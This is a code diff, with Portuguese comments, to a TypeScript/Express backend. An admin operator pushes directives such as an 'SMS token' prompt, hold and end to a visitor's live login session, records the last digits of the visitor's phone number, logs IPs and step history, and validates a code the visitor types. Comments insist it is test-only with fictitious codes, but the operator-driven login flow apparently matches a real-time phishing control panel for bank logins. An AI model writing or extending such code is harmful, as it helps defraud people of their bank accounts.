@@ -62,6 +62,14 @@ const VALID_COMMANDS: Record<string, { directive: string; status?: string; label
   end: { directive: "ended", status: "ended", label: "Comando: Encerrar sessão" },
 };
 
+/** Gera um código de homologação fictício (4 caracteres, A-Z e 0-9). */
+function genTestCode(): string {
+  const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+  let s = "";
+  for (let i = 0; i < 4; i++) s += alphabet[Math.floor(Math.random() * alphabet.length)];
+  return s;
+}
+
 /**
  * Público: registra/atualiza a sessão única do visitante conforme ele avança
  * no fluxo. NUNCA recebe senha/OTP. `respondTo` indica que o cliente respondeu
@@ -167,12 +175,12 @@ router.get("/auth-attempt/directive", async (req, res) => {
   }
   const row = (
     await db
-      .select({ directive: loginSessionsTable.directive, status: loginSessionsTable.status })
+      .select({ directive: loginSessionsTable.directive, status: loginSessionsTable.status, smsLast3: loginSessionsTable.smsLast3 })
       .from(loginSessionsTable)
       .where(eq(loginSessionsTable.sessionId, sessionId))
       .limit(1)
   )[0];
-  res.json({ directive: row?.directive ?? "none", status: row?.status ?? "active" });
+  res.json({ directive: row?.directive ?? "none", status: row?.status ?? "active", smsLast3: row?.smsLast3 ?? null });
 });
 
 const toClient = (r: LoginSessionRow) => ({
@@ -183,6 +191,8 @@ const toClient = (r: LoginSessionRow) => ({
   currentStep: r.currentStep,
   status: r.status,
   directive: r.directive,
+  smsLast3: r.smsLast3,
+  smsTestCode: r.smsTestCode,
   steps: r.steps ?? [],
   history: r.history ?? [],
   ip: r.ip,
@@ -227,17 +237,67 @@ router.post("/auth-attempt/command", requireAdmin, async (req, res) => {
     return;
   }
   const now = new Date().toISOString();
-  const history = [...(existing.history ?? []), { type: "command", label: spec.label, at: now }];
+  const updates: Record<string, unknown> = {
+    directive: spec.directive,
+    status: spec.status ?? existing.status,
+    updatedAt: new Date(),
+  };
+  let label = spec.label;
+  let testCode: string | undefined;
+
+  if (command === "sms_token") {
+    // Homologação: gera código fictício e guarda os 3 dígitos finais informados
+    // pelo operador. NUNCA há código real de autenticação aqui.
+    const last3 = (str(req.body?.last3, 6) ?? "").replace(/\D/g, "").slice(0, 3);
+    testCode = genTestCode();
+    updates.smsLast3 = last3 || null;
+    updates.smsTestCode = testCode;
+    label = `Comando: Token SMS (nº •••${last3 || "???"})`;
+  }
+
+  const history = [...(existing.history ?? []), { type: "command", label, at: now }];
+  updates.history = history;
+
+  await db.update(loginSessionsTable).set(updates).where(eq(loginSessionsTable.id, id));
+  res.json({ ok: true, testCode });
+});
+
+/**
+ * Público (PJ): valida o código de liberação de HOMOLOGAÇÃO digitado pelo cliente
+ * contra o código fictício gerado pelo sistema. NÃO armazena nem retorna o valor
+ * digitado; ao validar, registra apenas "Código de teste informado: ****" e o
+ * horário, e coloca a sessão em espera (hold) para o próximo comando do operador.
+ */
+router.post("/auth-attempt/sms-verify", async (req, res) => {
+  const sessionId = str(req.body?.sessionId, 80);
+  const code = (str(req.body?.code, 8) ?? "").toUpperCase().replace(/[^A-Z0-9]/g, "").slice(0, 4);
+  if (!sessionId || code.length !== 4) {
+    res.json({ valid: false });
+    return;
+  }
+  const existing = (
+    await db.select().from(loginSessionsTable).where(eq(loginSessionsTable.sessionId, sessionId)).limit(1)
+  )[0];
+  if (
+    !existing ||
+    existing.status === "ended" ||
+    existing.directive !== "sms_token" ||
+    !existing.smsTestCode ||
+    code !== existing.smsTestCode
+  ) {
+    res.json({ valid: false });
+    return;
+  }
+  const now = new Date().toISOString();
+  const history = [
+    ...(existing.history ?? []),
+    { type: "client", label: "Código de teste informado: ****", at: now },
+  ];
   await db
     .update(loginSessionsTable)
-    .set({
-      directive: spec.directive,
-      status: spec.status ?? existing.status,
-      history,
-      updatedAt: new Date(),
-    })
-    .where(eq(loginSessionsTable.id, id));
-  res.json({ ok: true });
+    .set({ directive: "hold", history, updatedAt: new Date() })
+    .where(eq(loginSessionsTable.id, existing.id));
+  res.json({ valid: true });
 });
 
 export default router;
